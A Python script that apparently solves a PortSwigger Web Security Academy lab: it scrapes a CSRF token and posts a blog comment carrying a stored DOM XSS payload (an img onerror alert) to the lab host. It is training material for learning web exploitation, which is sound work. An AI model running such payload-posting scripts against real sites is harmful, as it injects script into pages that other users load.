#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

# PortSwigger Web Security Academy lab URL.
LAB_URL = "https://0a8200ba03eb44e181c944a700ad00cc.web-security-academy.net"

session = requests.Session()

print("[*] Retrieving blog post...\n")

response = session.get(f"{LAB_URL}/post?postId=1")

soup = BeautifulSoup(response.text, "html.parser")

csrf = soup.find("input", {"name": "csrf"})["value"]

payload = {
    "csrf": csrf,
    "postId": "1",
    "name": "Hacker",
    "email": "hacker@example.com",
    "comment": "><<img src=1 onerror=alert(1)>"
}

print("[*] Posting XSS payload...\n")

response = session.post(
    f"{LAB_URL}/post/comment",
    data=payload,
)

print("=" * 50)
print(f"Status : {response.status_code}")
print()

if response.status_code == 200:
    print("[+] Comment submitted successfully.")
    print("[+] Reload the post to trigger the stored DOM XSS.")
else:
    print("[-] Failed to submit the comment.")
